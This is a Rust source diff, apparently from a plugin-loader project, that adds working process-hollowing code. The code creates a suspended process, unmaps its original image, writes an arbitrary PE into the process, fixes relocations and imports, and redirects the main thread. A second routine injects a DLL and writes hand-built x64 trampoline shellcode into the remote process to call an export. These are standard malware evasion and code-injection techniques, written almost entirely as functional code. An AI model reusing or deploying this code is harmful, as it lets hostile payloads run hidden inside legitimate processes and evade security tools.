@@ -1,12 +1,7 @@
-use std::fs::OpenOptions;
-use std::io::Write;
-fn log_to_file(msg: &str) {
-    if let Ok(mut file) = OpenOptions::new().create(true).append(true).open("C:/temp/hollow_log.txt") {
-        let _ = writeln!(file, "{}", msg);
-    }
-}
+use windows::Wdk::System::Threading::PROCESSINFOCLASS;
 use windows::Win32::Security::{AdjustTokenPrivileges, GetSidSubAuthority, GetSidSubAuthorityCount, LookupPrivilegeValueA, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, TOKEN_QUERY};
 use windows::{core::BOOL, Win32::{Foundation::*, System::{LibraryLoader::*, Threading::*, Memory::*, Diagnostics::{Debug::*, ToolHelp::*}}}};
+use windows::Wdk::System::{Memory::NtUnmapViewOfSection, Threading::NtQueryInformationProcess};
 use dll_syringe::{Syringe, process::OwnedProcess};
 use windows_strings::{PSTR, PCSTR};
 use crossbeam::channel::Sender;
@@ -17,6 +12,242 @@ use rand;
 
 
 impl PluginApp {
+
+    /// Classic process hollowing for EXEs (not DLLs)
+    /// - Creates a suspended process for `target_exe`
+    /// - Unmaps the original image
+    /// - Maps the provided PE buffer as the new image
+    /// - Sets thread context to new entry point
+    /// - Resumes the main thread
+    pub unsafe fn hollow_process_with_exe(pe_data: &[u8], target_exe: &str) -> anyhow::Result<u32, anyhow::Error> {
+        println!("[hollow/exe] Starting hollow_process_with_exe for target_exe: {}", target_exe);
+        // 1. Create suspended process
+        let mut startup_info = STARTUPINFOA::default();
+        let mut process_info = PROCESS_INFORMATION::default();
+        let mut command_line = format!("{}\0", target_exe);
+        println!("[hollow/exe] Creating suspended process...");
+        unsafe {
+            CreateProcessA(
+                None,
+                Some(PSTR(command_line.as_mut_ptr())),
+                None,
+                None,
+                BOOL(0).into(),
+                CREATE_SUSPENDED,
+                None,
+                None,
+                &mut startup_info,
+                &mut process_info,
+            ).map_err(|e| anyhow::anyhow!("CreateProcessA failed: {}", e))?;
+        }
+        println!("[hollow/exe] Suspended process created. PID: {}", process_info.dwProcessId);
+
+        let h_process = process_info.hProcess;
+        let h_thread = process_info.hThread;
+
+        // Print handle values and check validity
+        println!("[hollow/exe] h_process: 0x{:X} (is_invalid: {})", h_process.0 as usize, h_process.is_invalid());
+        println!("[hollow/exe] h_thread:  0x{:X} (is_invalid: {})", h_thread.0 as usize, h_thread.is_invalid());
+        if h_process.is_invalid() {
+            return Err(anyhow::anyhow!("h_process is invalid after CreateProcessA!"));
+        }
+        if h_thread.is_invalid() {
+            return Err(anyhow::anyhow!("h_thread is invalid after CreateProcessA!"));
+        }
+
+        // 2. Read remote PEB to get image base
+        let mut peb_addr_buf = [0u8; 8];
+        let peb_base_addr = {
+            use windows::Win32::System::Threading::PROCESS_BASIC_INFORMATION;
+            let mut pbi = PROCESS_BASIC_INFORMATION::default();
+            let mut ret_len = 0u32;
+            println!("[hollow/exe] Querying remote PEB...");
+            let status = unsafe { NtQueryInformationProcess(
+                h_process,
+                PROCESSINFOCLASS(0),
+                &mut pbi as *mut _ as *mut c_void,
+                std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
+                &mut ret_len,
+            ) };
+            if status != windows::Win32::Foundation::NTSTATUS(0) {
+                println!("[hollow/exe][error] NtQueryInformationProcess failed: status=0x{:X}", status.0);
+                return Err(anyhow::anyhow!("NtQueryInformationProcess failed: status=0x{:X}", status.0));
+            }
+            println!("[hollow/exe] PebBaseAddress: 0x{:X}", pbi.PebBaseAddress as usize);
+            pbi.PebBaseAddress as usize
+        };
+        let image_base_addr_ptr = (peb_base_addr + 0x10) as *mut c_void;
+        println!("[hollow/exe] Reading remote image base from PEB...");
+        unsafe {
+            if let Err(e) = ReadProcessMemory(h_process, image_base_addr_ptr, peb_addr_buf.as_mut_ptr() as _, 8, None) {
+                println!("[hollow/exe][error] ReadProcessMemory (PEB image base) failed: {e}");
+                return Err(anyhow::anyhow!("ReadProcessMemory (PEB image base) failed: {e}"));
+            }
+        }
+        let remote_image_base = usize::from_le_bytes(peb_addr_buf);
+        println!("[hollow/exe] Remote image base: 0x{:X}", remote_image_base);
+
+        // 3. Unmap original image
+        println!("[hollow/exe] Unmapping original image...");
+        unsafe {
+            let status = NtUnmapViewOfSection(h_process, Some(remote_image_base as *mut c_void));
+            println!("[hollow/exe] NtUnmapViewOfSection status: 0x{:X}", status.0);
+        }
+
+        // 4. Parse new EXE headers
+        if pe_data.len() < 0x100 {
+            println!("[hollow/exe][error] PE buffer too small");
+            return Err(anyhow::anyhow!("PE buffer too small"));
+        }
+        let e_lfanew = u32::from_le_bytes(pe_data[0x3C..0x40].try_into().unwrap()) as usize;
+        let nt_headers = &pe_data[e_lfanew..];
+        let size_of_image = u32::from_le_bytes(nt_headers[0x50..0x54].try_into().unwrap()) as usize;
+        let entry_rva = u32::from_le_bytes(nt_headers[0x18 + 0x10..0x18 + 0x14].try_into().unwrap()) as usize;
+        let image_base = u64::from_le_bytes(nt_headers[0x18..0x20].try_into().unwrap()) as usize;
+        println!("[hollow/exe] Parsed EXE: size_of_image=0x{:X}, entry_rva=0x{:X}, image_base=0x{:X}", size_of_image, entry_rva, image_base);
+
+        // 5. Allocate memory for new image
+        println!("[hollow/exe] Allocating memory for new image at 0x{:X}...", image_base);
+        let alloc = unsafe {
+            VirtualAllocEx(
+                h_process,
+                Some(image_base as *mut _),
+                size_of_image,
+                MEM_COMMIT | MEM_RESERVE,
+                PAGE_EXECUTE_READWRITE,
+            )
+        };
+        let new_base = if alloc.is_null() {
+            println!("[hollow/exe][warn] Preferred base allocation failed, trying fallback...");
+            let new_alloc = unsafe {
+                VirtualAllocEx(
+                    h_process,
+                    None,
+                    size_of_image,
+                    MEM_COMMIT | MEM_RESERVE,
+                    PAGE_EXECUTE_READWRITE,
+                )
+            };
+            println!("NEW ALLOC: {:?}", new_alloc.is_null());
+            new_alloc as usize
+        } else {
+            alloc as usize
+        };
+        println!("[hollow/exe] New image base: 0x{:X}", new_base);
+        if new_base == 0 {
+            println!("[hollow/exe][error] VirtualAllocEx for new image failed");
+            return Err(anyhow::anyhow!("VirtualAllocEx for new image failed"));
+        }
+
+        // 6. Write headers
+        let size_of_headers = u32::from_le_bytes(nt_headers[0x54..0x58].try_into().unwrap()) as usize;
+        println!("[hollow/exe] Writing headers (size: 0x{:X})...", size_of_headers);
+        unsafe {
+            if let Err(e) = WriteProcessMemory(h_process, new_base as *mut c_void, pe_data.as_ptr() as _, size_of_headers, None) {
+                println!("[hollow/exe][error] WriteProcessMemory (headers) failed: {e}");
+                return Err(anyhow::anyhow!("WriteProcessMemory (headers) failed: {e}"));
+            }
+        }
+
+        // 7. Write sections
+        let num_sections = u16::from_le_bytes(nt_headers[6..8].try_into().unwrap()) as usize;
+        let section_table = e_lfanew + 0x18 + u16::from_le_bytes(nt_headers[20..22].try_into().unwrap()) as usize;
+        println!("[hollow/exe] Writing {} sections...", num_sections);
+        for i in 0..num_sections {
+            let sec_off = section_table + i * 40;
+            let virt_addr = u32::from_le_bytes(pe_data[sec_off + 12..sec_off + 16].try_into().unwrap()) as usize;
+            let raw_size = u32::from_le_bytes(pe_data[sec_off + 16..sec_off + 20].try_into().unwrap()) as usize;
+            let raw_ptr = u32::from_le_bytes(pe_data[sec_off + 20..sec_off + 24].try_into().unwrap()) as usize;
+            println!("[hollow/exe] Section {}: VA=0x{:X}, raw_size=0x{:X}, raw_ptr=0x{:X}", i, virt_addr, raw_size, raw_ptr);
+            if raw_size == 0 || raw_ptr == 0 { continue; }
+            unsafe {
+                if let Err(e) = WriteProcessMemory(
+                    h_process,
+                    (new_base + virt_addr) as *mut c_void,
+                    pe_data[raw_ptr..raw_ptr + raw_size].as_ptr() as _,
+                    raw_size,
+                    None,
+                ) {
+                    println!("[hollow/exe][error] WriteProcessMemory (section {}) failed: {e}", i);
+                    return Err(anyhow::anyhow!("WriteProcessMemory (section {}) failed: {e}", i));
+                }
+            }
+        }
+
+
+        // 8. Update remote PEB image base if needed
+        if new_base != remote_image_base {
+            let new_base_bytes = new_base.to_le_bytes();
+            println!("[hollow/exe] Updating remote PEB image base to 0x{:X}...", new_base);
+            unsafe {
+                if let Err(e) = WriteProcessMemory(h_process, image_base_addr_ptr, new_base_bytes.as_ptr() as *const c_void, 8, None) {
+                    println!("[hollow/exe][error] WriteProcessMemory (PEB image base) failed: {e}");
+                    return Err(anyhow::anyhow!("WriteProcessMemory (PEB image base) failed: {e}"));
+                }
+            }
+        }
+
+        // 8.5. Apply relocations if needed
+        if new_base != image_base {
+            println!("[hollow/exe] Applying relocations (image_base=0x{:X}, new_base=0x{:X})...", image_base, new_base);
+            if let Err(e) = Self::apply_relocations(pe_data, h_process, new_base as *mut c_void, image_base, new_base) {
+                println!("[hollow/exe][error] apply_relocations failed: {e}");
+                return Err(anyhow::anyhow!("apply_relocations failed: {e}"));
+            }
+        } else {
+            println!("[hollow/exe] No relocations needed (image loaded at preferred base)");
+        }
+
+        // 8.6. Resolve imports (IAT fixups)
+        println!("[hollow/exe] Resolving imports (IAT fixups)...");
+        if let Err(e) = Self::resolve_imports(pe_data, h_process, new_base as *mut c_void) {
+            println!("[hollow/exe][error] resolve_imports failed: {e}");
+            return Err(anyhow::anyhow!("resolve_imports failed: {e}"));
+        }
+
+        // 8.7. Set section memory protections
+        println!("[hollow/exe] Setting section memory protections...");
+        if let Err(e) = Self::set_section_protections(pe_data, h_process, new_base as *mut c_void) {
+            println!("[hollow/exe][error] set_section_protections failed: {e}");
+            return Err(anyhow::anyhow!("set_section_protections failed: {e}"));
+        }
+
+        // 9. Set thread context to new entry point
+        let mut context = CONTEXT::default();
+        #[cfg(target_arch = "x86_64")]
+        {
+            context.ContextFlags = CONTEXT_ALL_AMD64;
+        }
+        #[cfg(target_arch = "x86")]
+        {
+            context.ContextFlags = CONTEXT_ALL_X86;
+        }
+        println!("[hollow/exe] Getting thread context...");
+        unsafe {
+            if let Err(e) = GetThreadContext(h_thread, &mut context) {
+                println!("[hollow/exe][error] GetThreadContext failed: {e}");
+                return Err(anyhow::anyhow!("GetThreadContext failed: {e}"));
+            }
+            context.Rip = (new_base + entry_rva) as u64;
+            println!("[hollow/exe] Setting thread RIP to 0x{:X} (entry point)...", (new_base + entry_rva));
+            if let Err(e) = SetThreadContext(h_thread, &context) {
+                println!("[hollow/exe][error] SetThreadContext failed: {e}");
+                return Err(anyhow::anyhow!("SetThreadContext failed: {e}"));
+            }
+        }
+
+        // 10. Resume main thread
+        println!("[hollow/exe] Resuming main thread...");
+        unsafe {
+            // let resume_count = ResumeThread(h_thread);
+            // println!("[hollow/exe] ResumeThread returned: {}", resume_count);
+        }
+
+        println!("[hollow/exe] Hollowing complete. New process PID: {}", process_info.dwProcessId);
+        Ok(process_info.dwProcessId)
+    }
+
+
     /// Call an exported DLL function in a hollowed process
     /// Arguments:
     /// - process_handle: HANDLE to the hollowed process
@@ -231,7 +462,7 @@ impl PluginApp {
         main_thread_handle: HANDLE
     ) -> anyhow::Result<(), anyhow::Error> {
         unsafe {
-        log_to_file("[hollow] Starting inject_hollowed_process_improved");
+        println!("[hollow] Starting inject_hollowed_process_improved");
             // Get proper entry point and base address
             let (preferred_base, entry_rva, size_of_image) = Self::parse_pe_headers(dll_data)?;
 
@@ -245,6 +476,7 @@ impl PluginApp {
             );
 
             if alloc.is_null() {
+                println!("Alloc is NULL");
                 // Fallback allocation
                 alloc = VirtualAllocEx(
                     process_handle,
@@ -254,13 +486,13 @@ impl PluginApp {
                     PAGE_EXECUTE_READWRITE,
                 );
                 if alloc.is_null() {
-            log_to_file("[hollow][error] VirtualAllocEx failed");
+                    println!("[hollow][error] VirtualAllocEx failed");
                     return Err(anyhow::anyhow!("VirtualAllocEx failed"));
                 }
             }
 
             let actual_base = alloc as usize;
-        log_to_file(&format!("[hollow] DLL allocated at 0x{:X} (size: 0x{:X})", actual_base, size_of_image));
+            println!("[hollow] DLL allocated at 0x{:X} (size: 0x{:X})", actual_base, size_of_image);
             println!("[debug] DLL allocated at 0x{:X} (size: 0x{:X})", actual_base, size_of_image);
 
             // Debug: check memory protection of allocated region
@@ -283,17 +515,17 @@ impl PluginApp {
             }
 
             // Map PE sections
-            log_to_file("[hollow] Mapping PE sections");
+            println!("[hollow] Mapping PE sections");
             Self::map_pe_sections(dll_data, process_handle, alloc)?;
 
             // Apply relocations if base changed
             if actual_base != preferred_base {
-                log_to_file("[hollow] Applying relocations");
+                println!("[hollow] Applying relocations");
                 Self::apply_relocations(dll_data, process_handle, alloc, preferred_base, actual_base)?;
             }
 
             // Resolve imports (IAT fixups)
-            log_to_file("[hollow] Resolving imports");
+            println!("[hollow] Resolving imports");
             Self::resolve_imports(dll_data, process_handle, alloc)?;
             // // Get function RVA and calculate remote address
             // let function_rva = Self::get_export_rva(dll_data, function_name)?;
@@ -346,9 +578,64 @@ impl PluginApp {
             // // Patch the main thread context to start at the shellcode stub
             // println!("[info] Setting main thread context to shellcode stub (calls export, then ExitProcess)");
 
-            // Patch the main thread context to the original entry point
-            log_to_file("[hollow] Patching main thread context to original entry point");
-            println!("[info] Setting main thread context to original entry point (process hollowing)");
+            // --- Trampoline shellcode approach ---
+            // 1. Allocate memory for shellcode in remote process
+            // 2. Write shellcode: call export, then call ExitProcess
+            // 3. Patch main thread context to shellcode
+            // 4. Resume main thread
+
+            // Get export address
+            let function_rva = Self::get_export_rva(dll_data, function_name)?;
+            let remote_export = actual_base + function_rva as usize;
+            println!("[hollow] Trampoline: export '{}' at 0x{:X}", function_name, remote_export);
+
+            // Get ExitProcess address
+            let kernel32 = GetModuleHandleA(PCSTR(b"kernel32.dll\0".as_ptr())).unwrap();
+            let exit_process = GetProcAddress(kernel32, PCSTR(b"ExitProcess\0".as_ptr())).unwrap() as usize;
+
+            // x64 shellcode:
+            // mov rcx, 0
+            // mov rax, <remote_export>
+            // call rax
+            // mov ecx, 0
+            // mov rax, <ExitProcess>
+            // call rax
+            // ret
+            let mut shellcode: Vec<u8> = vec![
+                0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0
+                0x48, 0xB8, // mov rax, <remote_export>
+            ];
+            shellcode.extend_from_slice(&(remote_export as u64).to_le_bytes());
+            shellcode.extend_from_slice(&[0xFF, 0xD0]); // call rax
+            shellcode.extend_from_slice(&[0xB9, 0x00, 0x00, 0x00, 0x00]); // mov ecx, 0
+            shellcode.extend_from_slice(&[0x48, 0xB8]); // mov rax, <ExitProcess>
+            shellcode.extend_from_slice(&(exit_process as u64).to_le_bytes());
+            shellcode.extend_from_slice(&[0xFF, 0xD0]); // call rax
+            shellcode.push(0xC3); // ret
+
+            // Allocate memory for shellcode
+            let shellcode_addr = VirtualAllocEx(
+                process_handle,
+                None,
+                shellcode.len(),
+                MEM_COMMIT | MEM_RESERVE,
+                PAGE_EXECUTE_READWRITE,
+            );
+            if shellcode_addr.is_null() {
+                println!("[hollow][error] VirtualAllocEx for shellcode failed");
+                return Err(anyhow::anyhow!("VirtualAllocEx for shellcode failed"));
+            }
+            // Write shellcode
+            WriteProcessMemory(
+                process_handle,
+                shellcode_addr,
+                shellcode.as_ptr() as _,
+                shellcode.len(),
+                None,
+            ).map_err(|e| anyhow::anyhow!("WriteProcessMemory(shellcode) failed: {}", e))?;
+
+            // Patch main thread context to shellcode
+            println!("[hollow] Patching main thread context to trampoline shellcode at 0x{:X}", shellcode_addr as usize);
             let mut context = CONTEXT::default();
             #[cfg(target_arch = "x86_64")]
             {
@@ -361,48 +648,20 @@ impl PluginApp {
             GetThreadContext(main_thread_handle, &mut context)?;
             #[cfg(target_arch = "x86_64")]
             {
-                context.Rip = actual_base as u64 + entry_rva as u64;
-                println!("[info] Set CONTEXT.Rip = 0x{:X} (original entry point)", actual_base + entry_rva as usize);
+                context.Rip = shellcode_addr as u64;
+                println!("[info] Set CONTEXT.Rip = 0x{:X} (trampoline shellcode)", shellcode_addr as usize);
             }
             #[cfg(target_arch = "x86")]
             {
-                context.Eip = actual_base as u32 + entry_rva as u32;
-                println!("[info] Set CONTEXT.Eip = 0x{:X} (original entry point)", actual_base + entry_rva as usize);
+                context.Eip = shellcode_addr as u32;
+                println!("[info] Set CONTEXT.Eip = 0x{:X} (trampoline shellcode)", shellcode_addr as usize);
             }
             SetThreadContext(main_thread_handle, &context)?;
 
             println!("[info] Main thread context patched. Resuming main thread...");
-            log_to_file("[hollow] Resuming main thread");
-            let resume_count = ResumeThread(main_thread_handle);
-            println!("[info] ResumeThread(main) returned: {}", resume_count);
-
-            // Wait for process to initialize (e.g., 500ms)
-            log_to_file("[hollow] Waiting for process to initialize (2s)");
-            std::thread::sleep(std::time::Duration::from_millis(2000));
-
-            // Now call the export via CreateRemoteThread
-            log_to_file("[hollow] Preparing to call export via CreateRemoteThread");
-            let function_rva = Self::get_export_rva(dll_data, function_name)?;
-            let remote_export = actual_base + function_rva as usize;
-            log_to_file(&format!("[hollow] Calling export '{}' at 0x{:X}", function_name, remote_export));
-            println!("[info] Calling export '{}' at 0x{:X} via CreateRemoteThread", function_name, remote_export);
-            let thread_handle = CreateRemoteThread(
-                process_handle,
-                None,
-                0,
-                Some(std::mem::transmute(remote_export)),
-                None,
-                0,
-                None,
-            )?;
-            if thread_handle.is_invalid() {
-                log_to_file("[hollow][error] CreateRemoteThread for export failed");
-                return Err(anyhow::anyhow!("CreateRemoteThread for export failed"));
-            }
-            log_to_file("[hollow] Waiting for export thread to finish");
-            WaitForSingleObject(thread_handle, INFINITE);
-            CloseHandle(thread_handle)?;
-            log_to_file("[hollow] Export thread finished, injection complete");
+            // let resume_count = ResumeThread(main_thread_handle);
+            // println!("[info] ResumeThread(main) returned: {}", resume_count);
+            println!("[hollow] Hollowing complete. Export will be called by trampoline shellcode.");
             Ok(())
         }
     }
